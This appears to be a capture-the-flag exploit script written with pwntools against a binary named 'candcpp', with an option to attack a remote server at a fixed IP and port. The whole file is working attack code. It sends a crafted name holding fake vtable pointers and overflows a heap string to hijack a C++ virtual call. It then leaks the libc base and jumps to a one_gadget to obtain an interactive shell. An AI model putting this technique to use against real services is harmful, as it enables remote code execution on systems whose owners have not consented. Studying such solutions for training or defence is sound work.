from pwn import *
from time import sleep
import sys

context.arch = 'amd64'
status 	= sys.argv[1]
elf 	= ELF("./candcpp")
libc 	= ELF("./libc-2.23.so")
host 	= "154.8.222.144"
port 	= 9999
main	= 0x4009a0
fmtleak = 0x400e10
vtable	= 0x401228
name	= 0x602328

if status == 'l':
	io = process("./candcpp")
elif status == 'r':
	io = remote(host,port)
else:
	info("INVALID STATUS")
	exit()

def choice(c):
	sleep(0.1)
	io.sendlineafter(">> ",str(c))
def malloc(size,string):
	choice(1)
	io.sendlineafter("Please input length of the string\n",str(size))
	io.sendafter("Please input the string\n",string)
def new(size,string):
	choice(3)
	io.sendlineafter("Please input length of the string\n",str(size))
	io.sendafter("Please input the string\n",string)
def free(index):
	choice(2)
	io.sendlineafter("Please input index of the string\n",str(index))
def delete(index):
	choice(4)
	io.sendlineafter("Please input index of the string\n",str(index))
def put(index):
	choice(5)
	io.sendlineafter("Please input index of the string\n",str(index))

io.sendafter("Please input your name: ",p64(fmtleak)+p64(main)[:-1]+'\n')
malloc(15,p64(1)+p64(name)[:-2]+'\n')
new(0x200,'AAAAAAAAAAAAAAAA'*27+'AAA'+p64(name+8)+'AAAAAAA'+p64(name)+'\n')
delete(0)
io.recvuntil('0x')
libc_base = int(io.recv(12),16)-libc.sym['_IO_puts']
success("LIBC BASE -> %#x"%libc_base)

one = libc_base+0xf02a4
io.sendafter("Please input your name: ",p64(one)+p64(main)[:-1]+'\n')
delete(0)

io.interactive()
